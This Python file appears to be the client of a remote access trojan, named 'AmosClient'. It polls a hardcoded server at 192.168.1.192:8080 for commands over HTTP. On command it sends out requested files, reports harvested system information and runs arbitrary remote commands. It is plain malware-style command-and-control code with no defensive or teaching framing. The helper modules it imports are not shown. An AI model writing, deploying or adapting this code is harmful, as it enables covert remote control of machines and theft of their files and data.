from urllib import request, parse
from ServerHandler import ServerHandler
from DataHarvester import DataHarvester
import subprocess
import time
import os


class AmosClient:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server_handler = ServerHandler(ip, port)
        self.data_harvester = DataHarvester()


    def start(self):

        while True:
            command = request.urlopen(f"http://{self.ip}:{self.port}").read().decode()
            print(command)

            if 'terminate' in command:
                break

            # Send file
            if 'get' in command:
                self.server_handler.send_file(command)
                continue

            # Send file
            if command == "check call":
                self.server_handler.send_data("active")
                continue

            if command == "sys_info":
                system_info = self.data_harvester.get_platform_info()
                print(system_info)
                self.server_handler.send_data(system_info)
                continue

            self.server_handler.run_command(command)
            time.sleep(1)



client = AmosClient("192.168.1.192", 8080)
client.start()

